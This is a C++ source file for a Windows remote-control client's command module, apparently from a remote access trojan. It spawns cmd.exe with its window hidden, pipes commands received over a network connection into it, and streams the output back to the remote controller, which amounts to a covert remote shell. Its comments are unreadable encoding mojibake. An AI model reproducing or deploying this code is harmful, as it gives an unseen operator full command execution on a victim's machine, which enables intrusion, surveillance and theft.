#include "CmdManager.h"



CCmdManager::CCmdManager(_CIOCPClient* IOCPClient) :CManager(IOCPClient)
{
	printf("CCmdManager()����\r\n");
	//����һ��ܵ���Cmd���̽���CMDͨѶ
	
	SECURITY_ATTRIBUTES SecurityAttributes = { 0 };
	SecurityAttributes.nLength = sizeof(SecurityAttributes);
	SecurityAttributes.lpSecurityDescriptor = NULL;
	SecurityAttributes.bInheritHandle = TRUE;
	
	//m_ThreadHandle = NULL;
	m_CmdProcessHandle = NULL;//����Cmd���̵Ľ��̾�������߳̾��
	m_CmdThreadHandle = NULL;
	m_CmdCodeLength = 0;
	m_ReadHandle1 = NULL;//Client
	m_WriteHandle1 = NULL;//Client
	m_ReadHandle2 = NULL;//Cmd
	m_WriteHandle2 = NULL;//Cmd
	
	if (!CreatePipe(&m_ReadHandle1, &m_WriteHandle2, &SecurityAttributes, 0))
	{
		if (m_ReadHandle1 != NULL)
		{
			CloseHandle(m_ReadHandle1);
		}
		if (m_WriteHandle2 != NULL)
		{
			CloseHandle(m_WriteHandle2);
		}
		return;
	}
	if (!CreatePipe(&m_ReadHandle2, &m_WriteHandle1, &SecurityAttributes, 0))
	{
		if (m_ReadHandle2 != NULL)
		{
			CloseHandle(m_ReadHandle2);
		}
		if (m_WriteHandle1 != NULL)
		{
			CloseHandle(m_WriteHandle1);
		}
		return;
	}
	//����CMD�ӽ��̲��Ҳ���ʾ����
	//���Cmd Path
	char CmdFullPath[MAX_PATH] = { 0 };

	GetSystemDirectory(CmdFullPath, MAX_PATH);
	//cmd.exe·����д���� C:\windows\system32
	strcat(CmdFullPath, "\\cmd.exe");                             
	//C:\windows\system32\cmd.exe

	//1 Cmd Input Output Ҫ�͹ܵ���Ӧ��
	//2 Cmd Hide

	STARTUPINFO         StartupInfo = { 0 };
	PROCESS_INFORMATION ProcessInfo = { 0 };

	//memset((void*)&StartupInfo, 0, sizeof(StartupInfo));
	//memset((void*)&ProcessInfo, 0, sizeof(ProcessInfo));

	//��Ҫ->һ��Ҫ��ʼ���ó�Ա(�Լ�)
	StartupInfo.cb = sizeof(STARTUPINFO);

	StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	StartupInfo.hStdInput = m_ReadHandle2;                           
	//���ܵ�������Cmd��ֵ
	StartupInfo.hStdOutput = StartupInfo.hStdError = m_WriteHandle2;
	/*
	Clinet         Cmd
	Write1 ------> Read2
	Read1  <------ Write2
	*/
	StartupInfo.wShowWindow = SW_HIDE;   //��������
										//����Cmd����
										//3 �̳�
										//����Cmd����
	if (!CreateProcess(CmdFullPath, NULL, NULL, NULL, TRUE,
		NORMAL_PRIORITY_CLASS, NULL, NULL, &StartupInfo, &ProcessInfo))
	{
		CloseHandle(m_ReadHandle1);
		CloseHandle(m_WriteHandle1);
		CloseHandle(m_ReadHandle2);
		CloseHandle(m_WriteHandle2);
		return;
	}

	m_CmdProcessHandle = ProcessInfo.hProcess;    //����Cmd���̵Ľ��̾�������߳̾��
	m_CmdThreadHandle  = ProcessInfo.hThread;
	
	

	//Client Server
	BYTE IsToken = CLIENT_CMD_MANAGER_REPLY;            //����ͷ�ļ� Common.h     
	m_IOCPClient->OnSending((char*)&IsToken, 1);
	m_IsLoop = TRUE;

	WaittingForDialogOpen();

	//������ȡ�ܵ��е����ݵ��߳�
	m_ThreadHandle = CreateThread(NULL, 0,
		(LPTHREAD_START_ROUTINE)ReceiveProceduce, (LPVOID)this, 0, NULL);   //Client ��ȡ�ܵ�����  
																		//�ص�*/

}

CCmdManager::~CCmdManager()
{
	printf("~CCmdManager()����\r\n");
	
	m_IsLoop = FALSE;
	Sleep(10);
	TerminateThread(m_CmdThreadHandle, 0);     //���������Լ�������Cmd�߳�
	TerminateProcess(m_CmdProcessHandle, 0);   //���������Լ�������Cmd����

	Sleep(100);

	if (m_ReadHandle1 != NULL)
	{
		DisconnectNamedPipe(m_ReadHandle1);
		CloseHandle(m_ReadHandle1);
		m_ReadHandle1 = NULL;
	}
	if (m_WriteHandle1 != NULL)
	{
		DisconnectNamedPipe(m_WriteHandle1);
		CloseHandle(m_WriteHandle1);
		m_WriteHandle1 = NULL;
	}
	if (m_ReadHandle2 != NULL)
	{
		DisconnectNamedPipe(m_ReadHandle2);
		CloseHandle(m_ReadHandle2);
		m_ReadHandle2 = NULL;
	}
	if (m_WriteHandle2 != NULL)
	{
		DisconnectNamedPipe(m_WriteHandle2);
		CloseHandle(m_WriteHandle2);
		m_WriteHandle2 = NULL;
	}
}

VOID CCmdManager::HandleIO(PBYTE BufferData, ULONG BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_GO_ON:
	{
		NotifyDialogIsOpen();
		break;
	}
	default:
	{
		//�����ɷ���˷��͹���������
		//��������д���ܵ�
		unsigned long	ReturnLength = 0;
		m_CmdCodeLength = BufferLength-2;
		if (WriteFile(m_WriteHandle1, BufferData, BufferLength, &ReturnLength, NULL))
		{

		}
		break;
	}
	}
}

DWORD CCmdManager::ReceiveProceduce(LPVOID ParameterData)
{
	unsigned long   ReturnLength = 0;
	char	v1[0x400] = { 0 };
	DWORD	BufferLength = 0;
	CCmdManager *This = (CCmdManager*)ParameterData;

	while (This->m_IsLoop)
	{
		Sleep(100);
		//�������Ƿ�������  ���ݵĴ�С�Ƕ���
		while (PeekNamedPipe(This->m_ReadHandle1,     
			v1, sizeof(v1), &ReturnLength, &BufferLength, NULL))//��������
		{
			//���û�����ݾ�����������ѭ��
			if (ReturnLength <= 0)
			{
				break;
			}
				
			memset(v1, 0, sizeof(v1));

			LPBYTE BufferData = (LPBYTE)LocalAlloc(LPTR, BufferLength);

			
			//��ȡ�ܵ�����
			ReadFile(This->m_ReadHandle1,
				(LPVOID)(BufferData), BufferLength, &ReturnLength, NULL);
			

			This->m_IOCPClient->OnSending((char*)BufferData+ This->m_CmdCodeLength, ReturnLength- This->m_CmdCodeLength);
			LocalFree(BufferData);

		}
	}
	printf( "CCmdManager::ReceiveProceduce()�˳�\r\n" );
	return 0;
}